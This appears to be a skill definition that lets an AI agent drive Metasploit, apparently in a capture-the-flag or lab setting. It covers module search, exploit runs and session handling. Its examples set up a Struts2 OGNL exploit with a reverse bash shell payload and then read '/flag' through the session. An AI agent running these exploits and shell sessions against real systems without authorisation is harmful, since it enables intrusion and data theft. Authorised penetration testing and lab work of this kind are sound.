name: metasploit-session
description: Complete Metasploit replacement with module search, session management, and interactive execution
metadata: { "runtime": { "emoji": "🔐", "requires": { "bins": ["msfconsole"], "env": [] }, "primaryEnv": null } }

# Enhanced Metasploit with Session Management and Module Search

Complete Metasploit replacement skill that supports module search, exploit execution, session management, and interactive command execution. This skill replaces the original Metasploit skill with enhanced capabilities including persistent sessions, interactive shell access, and comprehensive module search functionality.

## Usage

Used by the executor with `target` (host or IP) and optional `params.mode`, `params.options`, `params.timeout`.

## Modes

### 0. Search Mode
Search for Metasploit modules by keyword, CVE, vulnerability name, or service
```json
{
  "params": {
    "mode": "search",
    "search_query": "struts2"
  }
}
```

### 1. Exploit Mode (Default)
Execute exploits and create sessions
```json
{
  "target": "http://target-host.com:8080/vulnerable-path",
  "params": {
    "mode": "exploit",
    "modules": "exploit/multi/http/struts2_content_type_ognl",
    "options": {
      "RHOSTS": "target-host.com",
      "RPORT": 8080,
      "TARGETURI": "/vulnerable-path",
      "PAYLOAD": "cmd/unix/reverse_bash"
    },
    "timeout": 300
  }
}
```

### 2. Session Interactive Mode
Execute commands in existing sessions
```json
{
  "params": {
    "mode": "session_interactive",
    "session_id": "1",
    "command": "ls -la /tmp"
  }
}
```

### 3. Session List Mode
List all active sessions
```json
{
  "params": {
    "mode": "session_list"
  }
}
```

### 4. Session Info Mode
Get detailed session information
```json
{
  "params": {
    "mode": "session_info",
    "session_id": "1"
  }
}
```

### 5. Session Close Mode
Close specific session
```json
{
  "params": {
    "mode": "session_close",
    "session_id": "1"
  }
}
```

## Module Search

### Search Queries
- **CVE numbers**: `CVE-2017-5638`, `CVE-2019-XXXX`
- **Vulnerability names**: `struts2`, `log4j`, `apache`
- **Services**: `http`, `ssh`, `ftp`, `smb`
- **Keywords**: `webshell`, `reverse_shell`, `rce`, `lfi`
- **Module types**: `exploit`, `auxiliary`, `post`

### Search Results
- Module names and types are returned in JSON format
- Count of found modules is provided
- Raw output is available for detailed analysis
- Results can be used directly in exploit mode

## Session Management

### Session Creation
- Sessions are automatically created when exploits succeed
- Each session gets a unique ID (1, 2, 3, ...)
- Sessions include target, module, and activity tracking

### Session Commands
- `session <id>` - Switch to specific session
- `sessions` - List all sessions
- `sessions -k <id>` - Kill specific session
- `exit` - Exit session

### Interactive Commands
- `help` - Show help
- `pwd` - Print working directory
- `ls` - List directory contents
- `cat <file>` - Display file contents
- `upload <local> <remote>` - Upload file
- `download <remote> <local>` - Download file
- `shell` - Interactive shell

## Parameters

| Param | Type | Required | Description |
|-------|------|----------|-------------|
| target | string | yes | Target host or URL (exploit mode only) |
| mode | string | no | Execution mode: search, exploit, session_interactive, session_list, session_info, session_close |
| search_query | string | no | Search query for module search (search mode only) |
| session_id | string | no | Session ID for session operations |
| command | string | no | Command to execute (session_interactive mode) |
| modules | string | no | Metasploit module to use (exploit mode) or search query (search mode) |
| options | dict | no | Module options (RHOSTS, RPORT, TARGETURI, PAYLOAD, etc.) |
| timeout | int | no | Timeout in seconds (default 300) |
| extra | list | no | Additional msfconsole arguments |

## Examples

### Exploit with Session Creation
```json
{
  "target": "http://s2-045-struts2-1:8080/doUpload.action",
  "params": {
    "mode": "exploit",
    "modules": "exploit/multi/http/struts2_content_type_ognl",
    "options": {
      "RHOSTS": "s2-045-struts2-1",
      "RPORT": 8080,
      "TARGETURI": "/doUpload.action",
      "PAYLOAD": "cmd/unix/reverse_bash"
    },
    "timeout": 300
  }
}
```

### Execute Commands in Session
```json
{
  "params": {
    "mode": "session_interactive",
    "session_id": "1",
    "command": "cat /flag"
  }
}
```

### List All Sessions
```json
{
  "params": {
    "mode": "session_list"
  }
}
```

### Read Flag from Session
```json
{
  "params": {
    "mode": "session_interactive", 
    "session_id": "1",
    "command": "cat /flag"
  }
}
```

## Session Lifecycle

1. **Creation**: Sessions are created when exploits succeed
2. **Activity**: Sessions track last activity time
3. **Cleanup**: Expired sessions are automatically cleaned up
4. **Manual Closure**: Sessions can be manually closed

## Advanced Features

### Session Persistence
- Sessions remain active between commands
- Session state is maintained across multiple operations
- Sessions can be used for post-exploitation tasks

### Session History
- Command history is tracked for each session
- Recent commands are available for review
- Commands can be repeated or modified

### Session Management Commands
- `sessions -l` - List active sessions
- `sessions -k <id>` - Kill specific session
- `sessions -u <id>` - Update session priority

## Docker

Image built from `skills/metasploit-session/Dockerfile`.

## Network Configuration

When targeting Docker containers:
- Use container names instead of IP addresses
- Connect to the same Docker network
- Let Metasploit handle LHOST configuration

## Security Notes

- Sessions require proper network configuration
- Command execution is subject to target system permissions
- Session data should be protected when not in use
- Clean up sessions after completing work
